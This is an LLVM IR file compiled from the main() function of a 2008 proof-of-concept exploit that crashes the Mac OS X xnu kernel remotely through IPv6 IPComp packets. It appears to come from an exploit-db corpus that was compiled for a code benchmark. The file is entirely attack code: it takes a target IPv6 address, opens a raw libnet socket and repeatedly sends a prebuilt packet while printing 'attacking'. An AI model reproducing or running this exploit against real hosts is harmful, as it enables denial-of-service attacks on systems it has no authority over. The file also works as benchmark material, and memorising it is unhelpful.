; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_5191.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_5191.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@LIBNET_ERRBUF_SIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [143 x i8] c"Apple MACOS X xnu <= 1228.3.13 ipv6-ipcomp remote kernel DoS PoC\0Aby: <mu-b@digit-labs.org>\0Ahttp://www.digit-labs.org/ -- Digit-Labs 2008!@$!\0A\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [22 x i8] c"Usage: %s <dst ipv6>\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@IPV6_INTERFACE = common dso_local global i32 0, align 4
@pbuf = common dso_local global i32* null, align 8
@IPV6_SRC_OFFSET = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [24 x i8] c"* get_localip() failed\0A\00", align 1
@AF_INET6 = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [22 x i8] c"* inet_pton() failed\0A\00", align 1
@IPV6_DST_OFFSET = common dso_local global i64 0, align 8
@LIBNET_RAW6_ADV = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [28 x i8] c"* libnet_init() failed: %s\0A\00", align 1
@.str.5 = private unnamed_addr constant [20 x i8] c"* local ipv6 %s...\0A\00", align 1
@.str.6 = private unnamed_addr constant [18 x i8] c"* attacking %s...\00", align 1
@HAMMER_NUM = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [6 x i8] c"done\0A\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca [128 x i8], align 16
  %9 = alloca i32, align 4
  %10 = alloca [4 x i32], align 16
  %11 = alloca i32*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = load i32, i32* @LIBNET_ERRBUF_SIZE, align 4
  %13 = zext i32 %12 to i64
  %14 = call i8* @llvm.stacksave()
  store i8* %14, i8** %6, align 8
  %15 = alloca i8, i64 %13, align 16
  store i64 %13, i64* %7, align 8
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([143 x i8], [143 x i8]* @.str, i64 0, i64 0))
  %17 = load i32, i32* %4, align 4
  %18 = icmp slt i32 %17, 2
  br i1 %18, label %19, label %27

19:                                               ; preds = %2
  %20 = load i32, i32* @stderr, align 4
  %21 = load i8**, i8*** %5, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 0
  %23 = load i8*, i8** %22, align 8
  %24 = call i32 (i32, i8*, ...) @fprintf(i32 %20, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.1, i64 0, i64 0), i8* %23)
  %25 = load i32, i32* @EXIT_FAILURE, align 4
  %26 = call i32 @exit(i32 %25) #4
  unreachable

27:                                               ; preds = %2
  %28 = load i32, i32* @IPV6_INTERFACE, align 4
  %29 = load i32*, i32** @pbuf, align 8
  %30 = load i64, i64* @IPV6_SRC_OFFSET, align 8
  %31 = getelementptr inbounds i32, i32* %29, i64 %30
  %32 = call i64 @get_localip(i32 %28, i32* %31)
  %33 = icmp slt i64 %32, 0
  br i1 %33, label %34, label %39

34:                                               ; preds = %27
  %35 = load i32, i32* @stderr, align 4
  %36 = call i32 (i32, i8*, ...) @fprintf(i32 %35, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.2, i64 0, i64 0))
  %37 = load i32, i32* @EXIT_FAILURE, align 4
  %38 = call i32 @exit(i32 %37) #4
  unreachable

39:                                               ; preds = %27
  %40 = load i32, i32* @AF_INET6, align 4
  %41 = load i8**, i8*** %5, align 8
  %42 = getelementptr inbounds i8*, i8** %41, i64 1
  %43 = load i8*, i8** %42, align 8
  %44 = getelementptr inbounds [4 x i32], [4 x i32]* %10, i64 0, i64 0
  %45 = call i64 @inet_pton(i32 %40, i8* %43, i32* %44)
  %46 = icmp sle i64 %45, 0
  br i1 %46, label %47, label %52

47:                                               ; preds = %39
  %48 = load i32, i32* @stderr, align 4
  %49 = call i32 (i32, i8*, ...) @fprintf(i32 %48, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.3, i64 0, i64 0))
  %50 = load i32, i32* @EXIT_FAILURE, align 4
  %51 = call i32 @exit(i32 %50) #4
  unreachable

52:                                               ; preds = %39
  %53 = load i32*, i32** @pbuf, align 8
  %54 = load i64, i64* @IPV6_DST_OFFSET, align 8
  %55 = getelementptr inbounds i32, i32* %53, i64 %54
  %56 = getelementptr inbounds [4 x i32], [4 x i32]* %10, i64 0, i64 0
  %57 = call i32 @memcpy(i32* %55, i32* %56, i32 16)
  %58 = load i32, i32* @LIBNET_RAW6_ADV, align 4
  %59 = call i32* @libnet_init(i32 %58, i32* null, i8* %15)
  store i32* %59, i32** %11, align 8
  %60 = load i32*, i32** %11, align 8
  %61 = icmp eq i32* %60, null
  br i1 %61, label %62, label %67

62:                                               ; preds = %52
  %63 = load i32, i32* @stderr, align 4
  %64 = call i32 (i32, i8*, ...) @fprintf(i32 %63, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.4, i64 0, i64 0), i8* %15)
  %65 = load i32, i32* @EXIT_FAILURE, align 4
  %66 = call i32 @exit(i32 %65) #4
  unreachable

67:                                               ; preds = %52
  %68 = load i32, i32* @AF_INET6, align 4
  %69 = load i32*, i32** @pbuf, align 8
  %70 = load i64, i64* @IPV6_SRC_OFFSET, align 8
  %71 = getelementptr inbounds i32, i32* %69, i64 %70
  %72 = getelementptr inbounds [128 x i8], [128 x i8]* %8, i64 0, i64 0
  %73 = call i32 @inet_ntop(i32 %68, i32* %71, i8* %72, i32 128)
  %74 = getelementptr inbounds [128 x i8], [128 x i8]* %8, i64 0, i64 0
  %75 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.5, i64 0, i64 0), i8* %74)
  %76 = load i8**, i8*** %5, align 8
  %77 = getelementptr inbounds i8*, i8** %76, i64 1
  %78 = load i8*, i8** %77, align 8
  %79 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.6, i64 0, i64 0), i8* %78)
  store i32 0, i32* %9, align 4
  br label %80

80:                                               ; preds = %88, %67
  %81 = load i32, i32* %9, align 4
  %82 = load i32, i32* @HAMMER_NUM, align 4
  %83 = icmp ult i32 %81, %82
  br i1 %83, label %84, label %91

84:                                               ; preds = %80
  %85 = load i32*, i32** %11, align 8
  %86 = load i32*, i32** @pbuf, align 8
  %87 = call i32 @libnet_write_raw_ipv6(i32* %85, i32* %86, i32 7)
  br label %88

88:                                               ; preds = %84
  %89 = load i32, i32* %9, align 4
  %90 = add i32 %89, 1
  store i32 %90, i32* %9, align 4
  br label %80

91:                                               ; preds = %80
  %92 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i64 0, i64 0))
  %93 = load i32, i32* @EXIT_SUCCESS, align 4
  store i32 %93, i32* %3, align 4
  %94 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %94)
  %95 = load i32, i32* %3, align 4
  ret i32 %95
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @fprintf(i32, i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i64 @get_localip(i32, i32*) #2

declare dso_local i64 @inet_pton(i32, i8*, i32*) #2

declare dso_local i32 @memcpy(i32*, i32*, i32) #2

declare dso_local i32* @libnet_init(i32, i32*, i8*) #2

declare dso_local i32 @inet_ntop(i32, i32*, i8*, i32) #2

declare dso_local i32 @libnet_write_raw_ipv6(i32*, i32*, i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
